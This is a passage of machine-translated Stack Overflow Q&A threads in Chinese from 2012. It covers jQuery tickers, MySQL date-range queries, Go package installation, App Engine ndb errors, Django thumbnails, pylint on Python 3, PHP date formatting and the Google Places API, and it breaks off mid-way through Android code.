尝试这个。

```
<ul id="ticker_02" class="ticker" onmouseover="stop1()" onmouseout="start1()">

<script>
var d
function tick2(){
    $('#ticker_02 li:first').slideUp( function () {    
        $(this).appendTo($('#ticker_02')).slideDown(); });
}
d=setInterval(function(){ tick2 () }, 2000);

function stop1(){
    clearInterval(d);
}

function start1(){
    setInterval(function(){ tick2 () }, 2000);
}
</script> 
```

# ruby - 匹配并删除 ruby 上的一些标题字符串

> ID：10772797
> 
> 赞同：0
> 
> 时间：2012-05-27T09:01:57.040
> 
> 标签：ruby, coding-style, header, rubygems, pattern-matching

我想解析文件并删除 ruby​​ 上的一些标头字符串。

要解析的文件如下所示。

```
---
some
text
text2
string
and
so
on
---
another string
and the other 
```

我想删除

```
---
some
text
text2
string
and
so
on
--- 
```

这部分。

**编辑：**我写了一个这样的红宝石代码

```
file = File.open("test")
a = file.readlines
skip = 0
a.each do |line|
   if line.match("---\n")
     if skip == 1
       skip-=1
     else
       skip+=1
     end
   else
     if skip != 1
       print line 
     end
   end

end 
```

这可行，但是，我认为我的代码很脏，应该清理。如何简化我的代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:05:32.997

这是一项微不足道的任务（假设文件格式正确）。

像这样的东西：

```
lines = # read lines from file

is_header_mode = false
lines.each do |line|
   if line == '---'
     is_header_mode = !is_header_mode
   else
     puts line unless is_header_mode
   end
end 
```

# mysql - 在 MYSQL 和 UNION 中生成日期范围

> ID：10772798
> 
> 赞同：1
> 
> 时间：2012-05-27T09:02:09.463
> 
> 标签：mysql, join, union

我正在尝试根据预定义的日期（截止日期）生成报告。我有两张桌子，进出桌和加班桌。

进出表

![进出表](../Images/cd3738d654671885bdee87e15e320265.png)

加班表

![加班表](../Images/f36202558fcc375e624b4db6dfdd27fa.png)

预期结果

![在此处输入图像描述](../Images/8b823122cf1f8d84bb6f96a15a7c31ed.png)

使用 UNION，它将日期加倍，但这可以通过 group by 解决，但 group 似乎在 UNION 中不起作用。

棘手的部分是显示 BLANK 1 月 6 日和 1 月 5 日。我需要展示它，因为它是一个时间表报告。

任何帮助或线索将不胜感激

代码：

```
SELECT emp_id,in,out,null 
FROM normal 
WHERE date >= '1-Jan' 
  AND date <= '10-Jan' 
  AND emp_id = '10001'
UNION
SELECT emp_id,null,null,minutes 
FROM overtime 
WHERE date >= '1-Jan' 
  AND date <= '10-Jan' 
  AND emp_id = '10001' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:15:14.540

这样的事情应该做你想做的（如果我理解这个问题）：

```
SELECT n.date, n.emp_id, n.in, n.out, o.minutes
FROM normal n 
JOIN overtime o USING(emp_id)
WHERE n.date BETWEEN '2012-01-01' AND '2012-01-10' 
```

请记住，如果您想显示没有匹配的日期，您必须创建一个包含此日期列表的表格：

## 日期

```
+------------+
| timestamp  |
|------------+
| 2012-01-01 |
| 2012-01-02 |
| ....       | 
```

然后您可以通过这种方式更改查询以获得您想要的结果集：

```
SELECT d.timestamp AS date, b.emp_id, b.in, b.out, b.minutes
FROM dates d
LEFT JOIN 
(SELECT n.date AS timestamp, n.emp_id AS emp_id, n.in AS in, n.out AS out, o.minutes AS minutes
 FROM normal n 
 JOIN overtime o USING(emp_id)
 ) b 
 USING(timestamp)
 WHERE d.timestamp BETWEEN '2012-01-01' AND '2012-01-10' 
```

如果您想避免使用日期表，您可以尝试使用这个更复杂的查询，应该会给您相同的结果，而不需要存储日期范围的第三个表：

```
SELECT d.timestamp AS date, b.emp_id, b.in, b.out, b.minutes
FROM ( 
SELECT '2012-01-01' + INTERVAL a + b DAY AS timestamp
FROM
(SELECT 0 a UNION SELECT 1 a UNION SELECT 2 UNION SELECT 3
UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7
UNION SELECT 8 UNION SELECT 9 ) d,
(SELECT 0 b UNION SELECT 10 UNION SELECT 20 
UNION SELECT 30 UNION SELECT 40) m
WHERE '2012-01-01' + INTERVAL a + b DAY  <  '2012-01-11'
ORDER BY a + b
) d
LEFT JOIN 
(SELECT n.date AS timestamp, n.emp_id AS emp_id, n.in AS in, n.out AS out, o.minutes AS minutes
 FROM normal n 
 JOIN overtime o USING(emp_id)
 ) b 
 USING(timestamp) 
```

# installation - 如何从下载源安装 golang 3rd-party 项目？

> ID：10772799
> 
> 赞同：45
> 
> 时间：2012-05-27T09:02:16.410
> 
> 标签：installation, go, mgo

我正在尝试安装[mgo](http://labix.org/mgo)，它是一个用 golang 编写的 mongo 驱动程序。

标准命令：

```
go get launchpad.net/mgo 
```

但由于一些证书问题，它失败了。

所以我手动将mgo的源下载到本地`E:\mgo`，但我不知道如何安装它。

文件树：

```
├─.bzr
│  ├─branch
│  │  └─lock
│  ├─branch-lock
│  ├─checkout
│  │  └─lock
│  └─repository
│      ├─indices
│      ├─lock
│      ├─obsolete_packs
│      ├─packs
│      └─upload
├─bson
└─testdb 
```

我试过了：

```
cd mgo
go install 
```

它报告：

```
auth.go:34:2: import "launchpad.net/mgo/bson": cannot find package 
```

但是，如果我尝试先安装 bson：

```
cd bson
go install 
```

它报告另一个错误：

```
go install: no install location for _/E_/mgo/bson 
```

那么，安装它的正确命令是什么？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-05-27T09:50:15.937

最后我成功安装了mgo项目。我认为这对初学者会有帮助，所以我在这里回答它。

**首先，我们需要 GOPATH**

定义一个环境变量`GOPATH`，这是你的项目根目录，它应该有一个子目录`src`。

对我来说，我将它定义为`E:\WORKSPACE_GO\mgo`，然后创建一个子目录`src`

**将项目复制到src**

`mgo`然后将项目复制到`%GOPATH%/mgo`，但一定要注意目录结构。它应该与sources中定义的包完全相同。

对于`mgo`，它的包是`launchpad.net/mgo`，所以结构应该是：

```
E:\WORKSPACE_GO\mgo\src\launchpad.net\mgo 
```

**去安装**

最后，`go install`他们：

```
cd E:\WORKSPACE_GO\mgo\src\launchpad.net\mgo\bson
go install

cd ..
go install 
```

如果没有错误输入，应该是安装成功了。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2013-04-29T16:26:36.430

[设置](https://github.com/golang/go/wiki/GOPATH) [GOPATH](https://stackoverflow.com/questions/7970390/what-should-be-the-values-of-gopath-and-goroot)。将代码移到`$GOPATH`. 然后

```
cd $GOPATH/src/github.com/user/package
go get . 
```

解释：

```
go build .    # produces binary in current dir 
go install .  # produces binary in $GOPATH/bin 
go get .      # same as 'install' but resolves import deps 
```

[更多关于那个](https://groups.google.com/d/msg/golang-nuts/_l6HBdrz1Fc/PPXVOOHJ2aAJ)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-03T17:13:10.177

您必须**将其放入您的`GOPATH/src`目录**中，保留导入路径（您传递给的路径`go install`）。

后备的 GOPATH 是你的**安装目录**。因此，您可以将*mgo*存储库克隆到`go/src/pkg/launchpad.net/mgo`.

**或者，当您为**依赖于 mgo的项目设置项目目录/环境并将`GOPATH`环境变量设置为该*FOLDER*时，您可以将*mgo*存储库克隆为`FOLDER/src/launchpad.net/mgo/`.

然后，您可以按预期在项目中使用 mgo 包：

```
import "launchpad.net/mgo" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-21T01:07:01.493

美中不足的是，GOPATH 是一条*路径*——类似于 Java 的类路径或 Unix 的 PATH。它不是单个目录位置：它是一系列目录位置。例如，我经常使用以下形式的语句，

```
GOPATH=dira:dirb:dirc go install mypackage 
```

# python - 实例化我的自定义用户类时获取 ndb AssertError

> ID：10772802
> 
> 赞同：0
> 
> 时间：2012-05-27T09:03:10.760
> 
> 标签：python, google-app-engine, google-cloud-datastore, assertions

尝试实例化我的用户模型时，我收到了 AssertError。在下面的堆栈跟踪中，我忽略了将请求分派给请求处理程序。

```
File "/Users/frederikcreemers/jsbeast/users.py", line 68, in get
    User(nickname=nickname,user=users.get_current_user()).put()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 2926, in _put
    return self._put_async(**ctx_options).get_result()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/tasklets.py", line 322, in get_result
    self.check_success()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/tasklets.py", line 317, in check_success
    self.wait()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/tasklets.py", line 301, in wait
    if not ev.run1():
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/eventloop.py", line 219, in run1
    delay = self.run0()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/eventloop.py", line 181, in run0
    callback(*args, **kwds)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/context.py", line 170, in _finished_callback
    fut.check_success()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/tasklets.py", line 362, in _help_tasklet_along
    value = gen.send(val)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/context.py", line 268, in _put_tasklet
    keys = yield self._conn.async_put(options, datastore_entities)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/datastore/datastore_rpc.py", line 1550, in async_put
    pbs = [self.__adapter.entity_to_pb(entity) for entity in entities]
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 548, in entity_to_pb
    pb = ent._to_pb()
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 2719, in _to_pb
    prop._serialize(self, pb)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 1245, in _serialize
    values = self._get_base_value_unwrapped_as_list(entity)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 1034, in _get_base_value_unwrapped_as_list
    wrapped = self._get_base_value(entity)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 1022, in _get_base_value
    return self._apply_to_values(entity, self._opt_call_to_base_type)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 1186, in _apply_to_values
    newvalue = function(value)
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 1065, in _opt_call_to_base_type
    value = _BaseValue(self._call_to_base_type(value))
File "/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/ext/ndb/model.py", line 599, in __init__
    assert not isinstance(b_val, list), repr(b_val)
AssertionError: [] 
```

发生这种情况的代码如下所示：

```
class LoginHandler(webapp2.RequestHandler):
    def get(self):
        url = self.request.get('url')

        if not url:
            url = "/"
        if User.current():
            self.redirect(url)
        else:
            if users.get_current_user():
                nickname = self.request.get("nickname")
                if(not nickname):
                    self.response.out.write(views.render("nickname"))
                    return
                else:
                    errors = []
                    if len(nickname) < 3:
                        errors.append("Your nickname should be at least 3 characters long.")

                    if(len(nickname) > 15):
                        errors.append("Your nickname should not be longer than 15 characters.")

                    import re
                    if not re.match(r"[0-9a-zA-Z_\.]+$",nickname):
                        errors.append("Your nickname can only contain small and capital letters, numbers, underscores and dots.")

                    if len(errors) == 0 and User.by_nickname(nickname):
                        errors.append("The name "+nickname+" is already in use.")

                    if len(errors) == 0:
                        import logging
                        User(nickname=nickname,user=users.get_current_user()).put()
                        self.redirect(url)
                    else:
                        self.response.out.write(views.render('nickname',{'errors':errors}))
                        return
            else:
                self.redirect(users.create_login_url("/user/login",federated_identity=self.request.get('provider'))) 
```

请注意，虽然我`google.appengine.api.users`从该模块导入 User 对象保存在用户命名空间中，但不会存在冲突。

这是 User 模型的样子：

```
class User(ndb.Model):
nickname = ndb.StringProperty()
email = ndb.StringProperty()
user = ndb.UserProperty()
num_solved_problems = ndb.ComputedProperty(lambda self: problems.Attempt.query().filter(problems.Attempt.user == self.user,problems.Attempt.correct == True).count())
solved_problems = ndb.ComputedProperty(lambda self:problems.Attempt.query().filter(problems.Attempt.user == self.user,problems.Attempt.correct == True).fetch())

@classmethod
def current(cls):
    if not users.get_current_user():
        return None
    return cls.query().filter(User.user == users.get_current_user()).get()

@classmethod
def by_nickname(cls,nickname):
        return cls.query().filter(User.nickname == nickname).get() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-29T01:19:29.093

我的猜测是 ComputedPropertysolved_problems 需要说 repeat=True 因为 fetch() 返回一个列表。

PS。不是你的错，但是当 SO 坚持显示水平滚动条时，很难阅读代码示例。

# javascript - 如何将 CSS 样式应用于由我无法控制的 Javascript 脚本注入和设置样式的 HTML

> ID：10772805
> 
> 赞同：0
> 
> 时间：2012-05-27T09:04:01.603
> 
> 标签：javascript, html, css, blogger

我使用 Blogger.com 创建了一个博客。

您可以编辑一些 HTML，包括加载到头部的 CSS 样式。

要在博客上执行各种操作，例如添加搜索框，您可以在 Blogger 的仪表板中启用各种“小工具”。这些将 Javascript 插入到注入 HTML 的页面中。

您不能编辑 Javascript 脚本。脚本使用内联 CSS 为它们注入的 HTML 设置样式。

如何使用插入头部的 CSS 覆盖这些样式？

我已经尝试过 !important 并尽可能具体地使用我的选择器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T10:18:04.230

根据[CSS 特殊性](http://www.w3.org/TR/CSS21/cascade.html#specificity)的规则，内联样式几乎总是获胜。看到[这个 jsfiddle](http://jsfiddle.net/RichardTowers/HmXXc/)。

您可以从样式表中获得一些限制，但是如果您可以访问页面上的一些 javascript，那么您应该能够根据自己的喜好设置样式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T11:00:22.107

我已经得出了答案。您只需在此处插入样式：

```
</body>
  <style type='text/css'>
     /* insert styles here */
  </style>
</html> 
```

然后在 Javascript 注入 HTML 后加载样式，覆盖内联样式。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T10:23:34.527

尝试将 !important 添加到 CSS 规则中。

或者自己写一些js

# ruby-on-rails - ActiveRecord，如何选择空字段

> ID：10772808
> 
> 赞同：0
> 
> 时间：2012-05-27T09:04:39.710
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, activerecord

我正在尝试计算所有姓氏为空的用户。

我正在尝试这些，但它们不起作用

```
User.where("last_name = ?", "").count
User.where("last_name = ?", nil).count 
```

调用 all 反对 nil 有效，但我仍然需要选择那些 last_name 为空的人。

```
User.where("last_name != ?", nil).count 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T09:10:14.310

```
User.where(:last_name => nil).count 
```

或使用 ARel：

```
User.where(User.arel_table[:last_name] == nil).count 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:07:46.617

对于 mysql 可能：

```
User.where("last_name is null").count 
```

否则可能：

```
User.find_all_by_last_name(nil).count 
```

# django - 通过递归调用模型生成用户提交图像的缩略图

> ID：10772815
> 
> 赞同：2
> 
> 时间：2012-05-27T09:05:46.203
> 
> 标签：django, django-models

我正在学习如何上传图片的[教程](http://lightbird.net/dbe/photo.html)，我完全不知道这个人用来为提交的图片生成缩略图的方法

这是他的代码的删减部分：

```
import os.path
from PIL import Image as PImage
from settings import MEDIA_ROOT
from tempfile import *

class Image(models.Model):
    image = models.FileField(upload_to="images/")
    thumbnail = models.ImageField(upload_to="images/", blank=True, null=True)

    def save(self, *args, **kwargs):
        super(Image, self).save(*args, **kwargs)
        im = PImage.open(pjoin(MEDIA_ROOT, self.image.name))

        fn, ext = os.path.splitext(self.image.name)
        im.thumbnail((128,128), PImage.ANTIALIAS)
        thumb_fn = fn + "-thumb" + ext
        tf = NamedTemporaryFile()
        im.save(tf.name, "JPEG")
        self.thumbnail.save(thumb_fn, File(open(tf.name)), save=False)
        tf.close()

        super(Image, self).save(*args, ** kwargs) 
```

所以我对此的具体问题是：

1.  他使用 FileField 作为图像，使用 ImageField 作为缩略图的任何原因？
2.  据我了解，`super(Image, self).save(*args, **kwargs)`保存模型。但他为什么最后又叫它？
3.  然后我不太了解角色扮演以及被调用`NamedTemporaryFile()`时究竟会发生什么`self.thumbnail.save(thumb_fn, File(open(tf.name)), save=False)`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T09:56:53.210

1.  我也会将 ImageField 用于主图像。ImageField 继承自 FileField 但确保只能上传图像文件，除其他外： [https ://docs.djangoproject.com/en/dev/ref/models/fields/#django.db.models.ImageField](https://docs.djangoproject.com/en/dev/ref/models/fields/#django.db.models.ImageField)

2.  首先`save()`将图像对象保存到数据库，但它（据说）还没有设置缩略图。第二次`save()`调用使用对实例所做的更改更新数据库（添加了缩略图）。

    他用 设置缩略图字段 `self.thumbnail.save(thumb_fn, File(open(tf.name)), save=False)`，但这只会将缩略图保存到适当位置的文件中，并用`thumbnail`它的路径填充实例的 attr。然后，您需要再次调用`save()`Image 实例以将对象上的更改更新到 DB（添加了缩略图）。

3.  代码正在读取上传的主图像文件，并使用内存中的图像组成缩略图（在内存中，它还没有作为文件存在）。

    但是该缩略图需要保存在一个文件中，以便它可以与 Django 一起使用`ImageFile`（期望上传的文件临时保存在磁盘上），这就是他正在做的`NamedTemporaryFile`.

    然后，该`ImageFile`实例负责将该文件复制到适当的位置（使用您的`MEDIA_ROOT`设置 +`upload_to`参数设置）。

# javascript - 喜欢过一个网站的人是否需要重新喜欢新的

> ID：10772819
> 
> 赞同：-1
> 
> 时间：2012-05-27T09:06:29.470
> 
> 标签：javascript, facebook-graph-api, facebook-page

我有一个有大量喜欢的网站。我想为该网站创建一个 Facebook 页面。那些已经喜欢该网站的人是否需要再次喜欢该Facebook页面？如何在新创建的 Facebook 页面中保留这些赞？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-05-27T09:25:07.087

没有办法强制或将 URL 之类的内容转移到 facebook*粉丝专页*。所以，是的，你需要用一个赞按钮询问用户是否喜欢这个粉丝专页。

# emacs - 目录的值

> ID：10772821
> 
> 赞同：4
> 
> 时间：2012-05-27T09:06:50.520
> 
> 标签：emacs, elisp, dired

我想在当前缓冲区的位置运行一个脚本，或者，如果它是一个 dired 缓冲区 - 在当前 dired 目录上运行脚本。当前的目录似乎存储在`dired-directory`变量中。确实是这样 - 但是当我尝试使用它时 - 它有时会给我以前的目录而不是当前的目录：

```
(defun bk-konsoles ()
  "Calls: bk-konsoles.bash"
  (interactive)
  (let ((curDir (if (memq major-mode '(dired-mode sr-mode)) dired-directory
                  (if (buffer-file-name) (file-name-directory (buffer-file-name))))))
    (shell-command (concat (expand-file-name "~/its/plts/goodies/bk-konsoles.bash ") curDir " & disown") nil nil)
    (kill-buffer "*Shell Command Output*")
    (delete-other-windows))) 
```

如何让 defun 获得 dired 当前目录的正确值？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-27T09:32:59.723

您可以使用变量`default-directory`.

在这种情况下，您无需检查您是否处于 dired 模式。

# python - 没有运气 pip 为 Python 3 安装 pylint

> ID：10772824
> 
> 赞同：6
> 
> 时间：2012-05-27T09:07:12.523
> 
> 标签：python, python-3.x, pylint

我有兴趣在我的 Python 3 代码上运行检查器以指出可能的缺陷。[PyChecker](http://pychecker.sourceforge.net/)不适用于 Python 3。我尝试 pip-install Pylint，但失败了。错误消息对我没有帮助[（请参阅粘贴）](https://gist.github.com/2802919)。

[Pylint 的自述文件](http://www.logilab.org/870)指出：

> Pylint 应该与任何 python >= 2.2 兼容。

但是，该页面不知何故感觉过时了。

pylint 与 Python 3 兼容吗？如果是，我该如何安装它？如果没有，我应该考虑其他选择吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T09:17:38.250

Yes, pylint versions > 0.23.0 do support Py3K.

Your issue seems to be described in [http://www.logilab.org/82417](http://www.logilab.org/82417) (also [Getting started with Pylint for Jython (jython2.5.1)](https://stackoverflow.com/questions/4310446/getting-started-with-pylint-for-jython-jython2-5-1))

The cached ticket page recommends running:

```
$ NO_SETUPTOOLS=1 python3.2 setup.py install --no-compile
$ easy_install-3.2 logilab-common
$ easy_install-3.2 logilab-astng
# You can probably use pip instead of easy_install... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-29T05:58:40.733

对于 Ubuntu 14.04：

```
sudo aptitude install python3-pip
sudo pip3 install pylint
/usr/local/bin/pylint your_file.py 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-03T08:35:32.667

经过一番挣扎，我设法让 pylint 在 Linux（Ubuntu12.04，尽管我认为以下版本并不重要）上的 Python3 中运行。我不确定我做错了什么，但是各种文件在错误的位置或访问模式错误，并且所有正常程序都失败了。[尝试通过 apt-get 和 pip 安装 pylint 肯定会造成混乱。] 我*认为*下面的顺序是让一切再次被拧开的原因。如果它可以帮助其他人（不保证），这就是我刚刚所做的：

1.  确保 /usr/bin/python 是指向 /usr/bin/python3.2 而不是 /usr/bin/python2.7 的符号链接 [*编辑*我随后遇到了各种 Python2 脚本因此而失败的问题，所以你安装 pylint 后可能需要将其重置为 python2。]
2.  sudo vi /usr/local/lib/python3.2/dist-packages/easy-install.pth 并删除对 pylint 和 logilab 鸡蛋的任何引用。[如果你刚刚开始，应该没有。]
3.  [从http://pypi.python.org/pypi/pylint/0.26.0](http://pypi.python.org/pypi/pylint/0.26.0)下载 pylint 。解压等
4.  cd 进入解压后的 pylint 目录并输入命令“sudo python3 setup.py install”

在那个阶段，命令“pylint”有效，但仅适用于超级用户。有些文件不是世界可读的。以下两个命令将它们整理出来：

1.  sudo chmod a+rx /usr/local/bin/pylint
2.  sudo chmod a+rX -R /usr/local/lib/python3.2

祝你好运！

编辑：我刚刚在另一个处于干净状态的 Linux 机器上完成了安装过程，除了必须以与上述 pylint 完全相同的方式安装两个依赖项（logilab-common 和 logilab-astng）之外，一切都很顺利. 所以看起来问题似乎是通过首先安装 Python 2 版本以及可能通过使用 pip 引起的。

# php - php 将日期转换为 YYYY-MM-DD hh:mm:ssTZD

> ID：10772825
> 
> 赞同：0
> 
> 时间：2012-05-27T09:07:15.707
> 
> 标签：php, date, xml-sitemap

我正在尝试通过 mysql 中的 php 脚本制作谷歌新闻站点地图。（所有日期保存为 +08:00 中的时间戳）

但是如何将日期转换为 YYYY-MM-DD hh:mm:ssTZD？

例如`1338048000`=>`2012-05-26T09:00:00+08:00`

```
echo date("Y-m-d T h:i:s",'1338048000').'+08:00';//2012-05-26 PDT 09:00:00+08:00 
```

不是我需要的结果。怎么做？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:10:30.907

我会说：

```
gmdate('Y-m-d\TH:i:s\Z', '1338048000'); 
```

这`T`意味着什么，需要逃脱。`c`或者，从 PHP5 开始，字符本身就支持 ISO8601 日期格式。

此外，使用`gmdate`而不是`date`无需担心时区。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:12:36.963

这个怎么样？

```
echo date("c",'1338048000'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T09:11:32.490

```
echo date("c", "1338048000").'+08:00'; 
```

# ruby-on-rails - delay_job_mongoid 不能使用 handle_asynchronously 但可以使用 .delay.method

> ID：10772826
> 
> 赞同：1
> 
> 时间：2012-05-27T09:07:16.740
> 
> 标签：ruby-on-rails, mongoid, delayed-job

我正在使用 Mongoid 和 delay_job_mongoid 宝石。一切都在其最新版本中，包括 Rails (3.2.3)。

我知道如果我在任何方法声明之后放置handle_asynchronously，该方法将始终异步运行。但我得到这样的未定义方法错误：

```
class Item
  # mongoid include stuff

  def shout
    puts 'a simple hi'
  end
  handle_asynchronously :shout
end

item = Item.create
item.shout # returns a delayed job object

j = _
# wait a moment
j.last_error 

{undefined method `shout_without_delay' for #<Item:0x007f8365e62978>
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/mongoid-2.4.9/lib/mongoid/attributes.rb:166:in `method_missing'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/performable_method.rb:26:in `perform'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/backend/base.rb:94:in `block in invoke_job'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/lifecycle.rb:60:in `call'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/lifecycle.rb:60:in `block in initialize'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/lifecycle.rb:65:in `call'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/lifecycle.rb:65:in `execute'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/lifecycle.rb:38:in `run_callbacks'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/backend/base.rb:91:in `invoke_job'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/worker.rb:178:in `block (2 levels) in run'
/Users/nik/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/timeout.rb:68:in `timeout'
/Users/nik/.rvm/gems/ruby-1.9.3-p194/gems/delayed_job-3.0.2/lib/delayed/worker.rb:178:in `block in run'
/Users/nik/.rvm/rubies/ruby-1.9.3-p194/lib/ruby/1.9.1/benchmark.rb:295:in `realtime' 
```

但是如果我打电话

```
item.delay.shout 
```

没有 handle_asynchronously 行

它会工作的！

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T23:02:58.627

这是帖子的作者。我发现发生了什么事。简短回答：您必须重新启动终端中的工作人员

```
[control + c]
rake jobs:work 
```

让 mongoid 延迟作业能够找到方法。我不知道为什么。因此，只要您添加了另一行 handle_asynchronously :method，请记住重新启动工作程序

快乐编码！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:22:33.490

你的语法应该是

```
class Item
   # mongoid include stuff

   def shout
      puts 'a simple hi'
   end
   handle_asynchronously :shout
end 
```

您可以从这里获取更多详细信息[https://github.com/collectiveidea/delayed_job](https://github.com/collectiveidea/delayed_job)

# android - 在 google maps for android 中查找最近的位置

> ID：10772831
> 
> 赞同：3
> 
> 时间：2012-05-27T09:08:43.323
> 
> 标签：android, google-maps, google-places-api

有没有办法根据特定点（Long/lat）在谷歌地图中找到最近的位置，我读了一些关于谷歌 Place API 的东西，但我没有意识到如何使用它.. 是否有可能找到下一个最近的也是？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-28T02:21:13.430

使用[Google Places API Web Service](https://developers.google.com/maps/documentation/places/)，您可以执行[Places Search Request](https://developers.google.com/maps/documentation/places/#PlaceSearchRequests)，`location`用户的 lat,lng 在哪里：

> [https://maps.googleapis.com/maps/api/place/search/json?location=-33.8670522,151.1957362&rankby=distance&types=food&sensor=false&key=AddYourOwnKeyHere](https://maps.googleapis.com/maps/api/place/search/json?location=-33.8670522,151.1957362&rankby=distance&types=food&sensor=false&key=AddYourOwnKeyHere)

如果您希望按时间顺序获取最近的位置而不是指定半径中最突出的位置，请确保指定`rankby=distance`参数而不是参数。`radius`

我还在`types=food`上面的请求中指定了一个参数，以便在我的响应中只返回食物类型的地方。可以在[此处](https://developers.google.com/maps/documentation/places/supported_types)找到其他支持的类型。

要使用[Google Places API 网络服务](https://developers.google.com/maps/documentation/places/)，您需要按照[此处](https://developers.google.com/maps/documentation/places/#Authentication)的说明获取 API 密钥以使用该服务，该密钥需要在`key=AddYourKeyHere`参数下随您的请求一起发送。

如果您希望在 JavaScript 应用程序中使用此服务，请查看[Google Maps API v3](https://developers.google.com/maps/documentation/javascript/)的[Places Library](https://developers.google.com/maps/documentation/javascript/places)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-09T04:26:58.460

您可以通过以下方式实现它

```
LocationManager locationManager = (LocationManager) context
                    .getSystemService(Context.LOCATION_SERVICE);
        LocationListener locationListener = new LocationListener() {
            @Override
        public void onStatusChanged(String provider, int status,
                Bundle extras) {
        }

        @Override
        public void onProviderEnabled(String provider) {
        }

        @Override
        public void onProviderDisabled(String provider) {
        }

        @Override
        public void onLocationChanged(Location location) {
            Double l1 = location.getLatitude();
            Double l2 = location.getLongitude();
            address = GetAddress(l1, l2);               
        }
    };
    locationManager.requestLocationUpdates(
            LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);  

private String GetAddress(Double lat, Double lon) {
    Geocoder geocoder = new Geocoder(context, Locale.ENGLISH);
    String ret = "";
